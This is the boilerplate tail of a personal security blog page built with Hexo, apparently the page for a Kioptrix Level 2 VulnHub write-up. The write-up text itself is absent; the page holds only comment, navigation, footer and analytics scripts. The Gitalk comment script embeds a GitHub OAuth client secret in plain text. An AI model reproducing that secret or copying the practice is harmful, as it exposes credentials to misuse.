                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,linkedin" data-wechat-qrcode-helper="<p>Scan WeChat to share！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>Comment</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'd1a260a4f0d995069b46',
        clientSecret: 'e42a99b019e82401bc661090b355e4e6e7198fa0',
        repo: 'mukhilanpari.github.io',
        owner: 'mukhilanpari',
        admin: "mukhilanpari",
        id: '2021-06-20T23-21-43',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;Current
            </div>
            <div class="card">
                <a href="/Writeups/Kioptrix-level-2/">
                    <div class="card-image">
                        
                        <img src="/medias/writeups/kioptrix/Kioptrix.png" class="responsive-img" alt="Kioptrix-level-2">
                        
                        <span class="card-title">Kioptrix-level-2</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            My Notes - Kioptrix Level 2 Writeup
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Writeups/" class="post-category">
                                    Writeups
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/OSCP/">
                        <span class="chip bg-color">OSCP</span>
                    </a>
                    
                    <a href="/tags/Notes/">
                        <span class="chip bg-color">Notes</span>
                    </a>
                    
                    <a href="/tags/VulnHub/">
                        <span class="chip bg-color">VulnHub</span>
                    </a>
                    
                    <a href="/tags/Writeups/">
                        <span class="chip bg-color">Writeups</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/Writeups/Lame-HTB-writeup/">
                    <div class="card-image">
                        
                        <img src="/medias/writeups/HTB/Lame/Lame.png" class="responsive-img" alt="Lame HTB Writeup">
                        
                        <span class="card-title">Lame HTB Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            My Notes - Lame HackTheBox Writeup
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-14
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Writeups/" class="post-category">
                                    Writeups
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/OSCP/">
                        <span class="chip bg-color">OSCP</span>
                    </a>
                    
                    <a href="/tags/Notes/">
                        <span class="chip bg-color">Notes</span>
                    </a>
                    
                    <a href="/tags/Writeups/">
                        <span class="chip bg-color">Writeups</span>
                    </a>
                    
                    <a href="/tags/HTB/">
                        <span class="chip bg-color">HTB</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2019</span>
            <a href="/about" target="_blank">Mukhilan</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total words on the site:&nbsp;<span
                class="white-color">8.4k</span>&nbsp;word
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;Times
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;Total number of visitors:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;people
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/mukhilanpari" class="tooltipped" target="_blank" data-tooltip="Visit my GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:mukhilanpari@gmail.com" class="tooltipped" target="_blank" data-tooltip="Email me" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/mukhilanpari" class="tooltipped" target="_blank" data-tooltip="
Follow me on Twitter: https://twitter.com/mukhilanpari" data-position="top" data-delay="50">
        <i class="fab fa-twitter"></i>
    </a>









    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS subscription" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- foot -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4717924901422002"
     data-ad-slot="6514624690"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
